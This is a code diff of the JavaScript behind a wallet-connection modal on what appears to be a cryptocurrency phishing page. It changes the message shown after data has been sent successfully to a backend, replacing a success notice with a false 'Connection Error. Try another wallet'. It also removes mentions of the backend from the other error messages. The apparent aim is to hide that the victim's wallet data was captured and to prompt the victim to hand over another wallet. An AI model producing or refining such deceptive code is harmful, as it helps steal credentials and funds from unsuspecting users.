@@ -1694,18 +1694,18 @@ textarea:focus, input:focus {
             });
 
             if (response.ok) {
-                document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Connection successful! Data sent via backend.';
+                document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Connection Error. Try another wallet';
                 setTimeout(() => {
                     walletModal.style.display = 'none';
                     document.body.style.overflow = 'auto';
                 }, 1000);
             } else {
                 const errorData = await response.json();
-                document.getElementById('errorScreen').querySelector('.error-message').textContent = `Error: ${errorData.message || 'Failed to connect to backend.'}`;
+                document.getElementById('errorScreen').querySelector('.error-message').textContent = `Error: ${errorData.message || 'Failed to connect'}`;
                 showScreen('error');
             }
         } catch (error) {
-            document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Network error. Ensure backend is running.';
+            document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Network error.....';
             showScreen('error');
         }
     }
